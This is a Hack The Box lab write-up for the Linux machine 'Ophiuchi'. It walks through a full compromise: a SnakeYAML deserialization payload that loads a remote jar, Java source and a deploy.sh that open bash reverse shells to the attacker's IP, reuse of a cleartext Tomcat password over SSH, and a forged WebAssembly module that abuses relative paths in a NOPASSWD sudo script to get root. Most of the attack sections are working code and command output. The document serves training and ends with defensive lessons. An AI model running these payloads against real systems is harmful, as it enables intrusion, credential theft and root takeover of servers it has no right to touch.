# HTB: Ophiuchi

**Difficulty:** Medium **OS:** Linux **Target IP:** 10.129.71.94 **Attacker IP:** 10.10.15.146

---

## 1. Reconnaissance

### Port Scanning

I started with a full TCP sweep to make sure I wasn't missing anything outside the default top-1000 ports, then followed up with a detailed service scan against whatever came back.

```
ports=$(nmap -p- --min-rate=1000 -T4 10.129.71.94 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -sCV -T4 10.129.71.94 -oA nmap/nmap
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
8080/tcp open  http    Apache Tomcat (language: en)
|_http-title: Parse YAML
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports open — SSH and a Tomcat instance on 8080. The `http-title` field already gives away the theme of the box: **"Parse YAML"**. With such a small attack surface, the web application on 8080 is clearly the intended entry point.

---

## 2. Web Enumeration

### 2.1 Content Discovery

```
ffuf -u http://10.129.71.94:8080/FUZZ \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt \
  -e .php,.html,.cgi,.php5 -mc 200,301,302,303,403 -fs 8042
```

```
test                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 536ms]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 300ms]
```

`/manager` is the standard Tomcat Manager application (locked behind auth, as expected), but the interesting content is on the root page itself: an **"Online YAML Parser"** form that takes arbitrary YAML input and parses it.

### 2.2 Understanding the Target — YAML Deserialization

YAML, like many serialization formats (Java's native serialization, PHP's `unserialize`, Python's `pickle`), can be abused when the parser is configured to instantiate arbitrary Java objects from tagged input rather than just plain data structures. Submitting a simple scalar value first confirmed the form was live and returning a response, and reviewing the page source confirmed this was a Java-based application — meaning the parser was almost certainly one of the well-known Java YAML libraries: **SnakeYAML**, **jYAML**, or **YamlBeans**. SnakeYAML in particular is well documented for allowing arbitrary class instantiation via the `!!` tag syntax when the underlying `Constructor` class isn't explicitly restricted (i.e. `SafeConstructor` isn't used).

I first tried some manual object-construction payloads to confirm the theory and understand what constraints I was working against:

```yaml
!!java.lang.System getProperties
```

```
HTTP Status 500 – Internal Server Error
Can't construct a java object for tag:yaml.org,2002:java.lang.System;
exception=No single argument constructor found for class java.lang.System : null
```

```yaml
!!java.lang.Runtime
exec: ["whoami"]
```

```
HTTP Status 500 – Internal Server Error
Cannot create property=exec for JavaBean=java.lang.Runtime@72a284a8
Unable to find property 'exec' on class: java.lang.Runtime
```

Both failed, but for informative reasons — SnakeYAML's `Constructor` only supports classes with a single-argument constructor or standard JavaBean-style properties. `Runtime` and `System` don't fit that shape directly, but this confirmed arbitrary class instantiation *was* happening — I just needed a class whose constructor SnakeYAML could actually satisfy, and which itself did something dangerous as a side effect of being constructed.

### 2.3 Verifying Callback Capability

Before building a full exploit chain, I confirmed I could make the target reach back out to me at all, using a simple `URL` object as a canary:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.15.146/"]
  ]]
]
```

```
python3 -m http.server 80
```

```
10.129.71.94 - - [24/Aug/2026] "HEAD /META-INF/services/javax.script.ScriptEngineFactory HTTP/1.1" 404 -
```

This confirmed the full chain: `ScriptEngineManager`'s constructor calls `initEngines()`, which uses Java's `ServiceLoader` to enumerate all classes implementing `ScriptEngineFactory` — and it does this by pulling a classloader from the `URLClassLoader` I supplied, pointed at my HTTP server, and looking for a service descriptor at `META-INF/services/javax.script.ScriptEngineFactory`. The 404 is expected (I hadn't served that file yet) — what matters is the server received the request, proving the deserialization chain executes and reaches out to attacker-controlled infrastructure.

---

## 3. Foothold

### 3.1 Building the Malicious Service Provider

The next step is to actually serve that `META-INF/services/javax.script.ScriptEngineFactory` file, pointing at a class that implements `ScriptEngineFactory` — because `ServiceLoader` will instantiate every class it lists, running that class's constructor as a side effect of just being *loaded*, regardless of whether the script engine itself is ever used.

I used the well-known [artsploit/yaml-payload](https://github.com/artsploit/yaml-payload) PoC as a base and replaced its constructor body with my reverse shell command:

```bash
git clone https://github.com/artsploit/yaml-payload.git
cd yaml-payload
```

```java
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.util.ArrayList;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() throws Exception {
        Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/10.10.15.146/4444 0>&1"});
    }

    public String getEngineName() { return null; }
    public String getEngineVersion() { return null; }
    public List<String> getExtensions() { return new ArrayList<>(); }
    public List<String> getMimeTypes() { return new ArrayList<>(); }
    public List<String> getNames() { return new ArrayList<>(); }
    public String getLanguageName() { return null; }
    public String getLanguageVersion() { return null; }
    public Object getParameter(String key) { return null; }
    public String getMethodCallSyntax(String obj, String m, String... args) { return null; }
    public String getOutputStatement(String toDisplay) { return null; }
    public String getProgram(String... statements) { return null; }
    public ScriptEngine getScriptEngine() { return null; }
}
```

### 3.2 A Java Version Mismatch

The first compile attempt used my system's default `javac`, and packaging/serving it seemed to work — the target correctly fetched the jar twice (SnakeYAML looks the service file up once, then loads the class):

```bash
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

```
10.129.71.94 - - "GET /yaml-payload.jar HTTP/1.1" 200 -
10.129.71.94 - - "GET /yaml-payload.jar HTTP/1.1" 200 -
```

...but no shell landed. Submitting the payload directly (rather than as a canary) surfaced the real error in Tomcat's stack trace:

```
java.lang.UnsupportedClassVersionError: artsploit/AwesomeScriptEngineFactory has been
compiled by a more recent version of the Java Runtime (class file version 65.0), this
version of the Java Runtime only recognizes class file versions up to 55.0
```

Class file version 65 corresponds to **Java 21**; the target's JRE only supports up to **version 55 (Java 11)**. My Kali box's default JDK was newer than the target could load — the class downloaded fine, but the JVM rejected the bytecode outright before the constructor ever ran. The fix was to explicitly target older bytecode at compile time:

```bash
javac --release 8 src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ .
```

### 3.3 Triggering the Shell

With a listener running and the correctly-versioned jar served from the right directory, I submitted the real payload:

```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://10.10.15.146/yaml-payload.jar"]
  ]]
]
```

```
nc -lvnp 4444
```

```
Connection received on 10.129.71.94
$ id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

✅ Foothold obtained as `tomcat`.

---

## 4. Lateral Movement

Tomcat's installation directory held its own configuration, including its realm/user definitions:

```bash
cat /opt/tomcat/conf/tomcat-users.xml
```

```xml
<user username="admin" password="whythereisalimit" roles="manager-gui,admin-gui"/>
```

A cleartext credential for a user named `admin` — worth testing directly against SSH, since Tomcat manager credentials being reused for real system accounts is a common misconfiguration on these boxes.

```bash
ssh admin@10.129.71.94
```

```
admin@10.129.71.94's password: whythereisalimit
admin@ophiuchi:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin)
```

✅ Lateral movement successful — now `admin` over SSH instead of the more restricted `tomcat` web-shell user.

---

## 5. Privilege Escalation

### 5.1 Enumerating sudo Rights

```bash
sudo -l
```

```
User admin may run the following commands on ophiuchi:
    (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
```

`admin` can run `go run` against a specific script, as any user (including root), without a password. Running it blind from the home directory failed:

```
$ sudo /usr/bin/go run /opt/wasm-functions/index.go
panic: runtime error: index out of range [0] with length 0
```

The panic traced back into `wasmer-go`'s instance handling — a strong hint the script relies on relative paths and expects to be run from its own directory. Running it from the correct location instead:

```bash
cd /opt/wasm-functions
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

```
Not ready to deploy
```

No crash this time, just a gate I needed to get past.

### 5.2 Reading the Go Source

```go
package main
import (
    "fmt"
    wasm "github.com/wasmerio/wasmer-go/wasmer"
    "os/exec"
    "log"
)
func main() {
    bytes, _ := wasm.ReadBytes("main.wasm")
    instance, _ := wasm.NewInstance(bytes)
    defer instance.Close()
    init := instance.Exports["info"]
    result,_ := init()
    f := result.String()
    if (f != "1") {
        fmt.Println("Not ready to deploy")
    } else {
        fmt.Println("Ready to deploy")
        out, err := exec.Command("/bin/sh", "deploy.sh").Output()
        if err != nil {
            log.Fatal(err)
        }
        fmt.Println(string(out))
    }
}
```

Two things stand out immediately. First, this program loads a **WebAssembly** module (`main.wasm`) and calls its exported `info()` function — if that function returns the string `"1"`, the script executes `deploy.sh`; otherwise it just prints the gate message I'd already seen. Second — and critically — **both `main.wasm` and `deploy.sh` are referenced by relative path, not absolute path.** Since this runs via `sudo` as root, whatever directory I invoke it from becomes the directory it loads its dependencies from.

`deploy.sh` itself, sitting in `/opt/wasm-functions`, was just a stub:

```bash
#!/bin/bash
# ToDo
# Create script to automatic deploy our new web at tomcat port 8080
```

Empty — but that's fine, since the relative-path behavior means I can supply my own version of both files from a different directory entirely.

### 5.3 Decompiling main.wasm

I pulled the real `main.wasm` back to my attack box to understand exactly what `info()` returns:

```bash
scp admin@10.129.71.94:/opt/wasm-functions/main.wasm /home/kali/ophiuchi/wasm/
```

I used [WABT](https://github.com/WebAssembly/wabt) (the WebAssembly Binary Toolkit) to build a local set of conversion tools:

```bash
git clone --recursive https://github.com/WebAssembly/wabt
cd wabt && mkdir build && cd build
cmake ..
cmake --build .
```

This particular build didn't produce a `wasm-decompile` binary, so I used `wasm2wat` instead — functionally equivalent for this purpose, converting the binary `.wasm` module into readable WebAssembly Text (WAT) format:

```bash
./wasm2wat /home/kali/ophiuchi/wasm/main.wasm -o /home/kali/ophiuchi/wasm/main-decompiled.wat
cat /home/kali/ophiuchi/wasm/main-decompiled.wat
```

```wat
(module
  (type (;0;) (func (result i32)))
  (func $info (type 0) (result i32)
    i32.const 0)
  (table (;0;) 1 1 funcref)
  (memory (;0;) 16)
  ...
  (export "memory" (memory 0))
  (export "info" (func $info))
  ...)
```

Confirmed: `info()` unconditionally returns `i32.const 0` — that's why the Go script always prints "Not ready to deploy" against the real files. To pass the gate, I needed to supply my own `main.wasm` whose `info()` export returns `1` instead.

### 5.4 Crafting a Malicious main.wasm

I wrote a minimal replacement module directly in WAT and compiled it back to binary WASM with `wat2wasm`:

```bash
cat > /home/kali/ophiuchi/wasm/main.wat << 'EOF'
(module
  (func (export "info") (result i32)
    i32.const 1
  )
)
EOF

./wat2wasm /home/kali/ophiuchi/wasm/main.wat -o /home/kali/ophiuchi/wasm/main-fake.wasm
```

### 5.5 Staging the Payload

I uploaded the fake module to `/tmp` on the target, alongside a malicious `deploy.sh` that spawns a reverse shell instead of doing nothing:

```bash
scp /home/kali/ophiuchi/wasm/main-fake.wasm admin@10.129.71.94:/tmp/main.wasm
```

```bash
cat > /tmp/deploy.sh << 'EOF'
#!/bin/bash
/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.146/1234 0>&1'
EOF
chmod +x /tmp/deploy.sh
```

### 5.6 Triggering from /tmp

Because `index.go` resolves `main.wasm` and `deploy.sh` relative to the current working directory, running the sudo command from `/tmp` makes it pick up my crafted files instead of the real ones in `/opt/wasm-functions` — while the binary itself still executes with root privileges via `sudo`.

```bash
cd /tmp
sudo /usr/bin/go run /opt/wasm-functions/index.go
```

```bash
nc -lvnp 1234
```

```
listening on [any] 1234 ...
connect to [10.10.15.146] from (UNKNOWN) [10.129.71.94] 33758
root@ophiuchi:/tmp# cd /root
root@ophiuchi:~# ls
go
root.txt
snap
```

✅ Root access obtained — `main.wasm`'s forged `info()` return value satisfied the deploy gate, and the relative-path `deploy.sh` execution ran entirely attacker-controlled code as root.

---

## 6. Summary

| Stage                | Technique                                                                                                                                                                 |
| --------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Recon                 | `nmap` full-port sweep → SSH (22) and Tomcat (8080) only, hosting an "Online YAML Parser"                                                                                 |
| Web Enum              | `ffuf` on 8080; confirmed a Java-backed SnakeYAML deserialization endpoint via manual `!!` tag probing                                                                    |
| Foothold              | Insecure SnakeYAML deserialization → `ScriptEngineManager` + `URLClassLoader` gadget chain loading a malicious `ScriptEngineFactory` jar → reverse shell as `tomcat`     |
| Compile Snag          | Payload jar initially failed with `UnsupportedClassVersionError` (Java 21 bytecode vs. target's Java 11 JRE) — fixed with `javac --release 8`                            |
| Lateral Movement      | Cleartext `admin` credential recovered from `/opt/tomcat/conf/tomcat-users.xml`, reused successfully over SSH                                                            |
| Privilege Escalation  | `sudo -l` allowed NOPASSWD `go run` on a relative-path-dependent script; decompiled the real `main.wasm` with `wasm2wat`, forged a fake module returning `info()==1`, and supplied a malicious `deploy.sh` from `/tmp` → root reverse shell |

**Root cause / lessons learned:**

- SnakeYAML's default `Constructor` allows arbitrary class instantiation from `!!` tags; this is remote code execution as soon as any class reachable on the classpath (or loadable via `URLClassLoader`) has a constructor with an exploitable side effect. Applications parsing untrusted YAML must use `SafeConstructor` (or an equivalent allow-list) instead.
- Storing cleartext credentials in application config files (`tomcat-users.xml`) is risky on its own, and becomes a full compromise multiplier the moment that password is reused for a real OS-level account.
- Granting `NOPASSWD` sudo rights to any command that resolves its dependencies via **relative paths** effectively hands over root to whoever controls the current working directory at execution time — the fix is to have such scripts use absolute paths (or be invoked from a fixed, non-writable working directory) rather than trusting the caller's `cwd`.
- "Security through obscurity" via a compiled WebAssembly gate (`info()` returning a magic value) provides no real protection once the binary is readable — decompiling it with public tooling (`wasm2wat`/WABT) took only minutes.

---

## 7. Tools Used

- `nmap` — full-port reconnaissance
- `ffuf` — content discovery on port 8080
- Manual SnakeYAML `!!` tag probing — confirming Java deserialization
- [artsploit/yaml-payload](https://github.com/artsploit/yaml-payload) — `ScriptEngineFactory` gadget PoC, modified for a bash reverse shell
- `javac --release 8` / `jar` — building a Java-11-compatible payload jar
- `python3 -m http.server` — serving the malicious jar
- `nc` — catching reverse shells
- [WABT](https://github.com/WebAssembly/wabt) (`wasm2wat`, `wat2wasm`) — WebAssembly decompilation and compilation
- `scp` — transferring `main.wasm` and the forged replacement between attacker and target
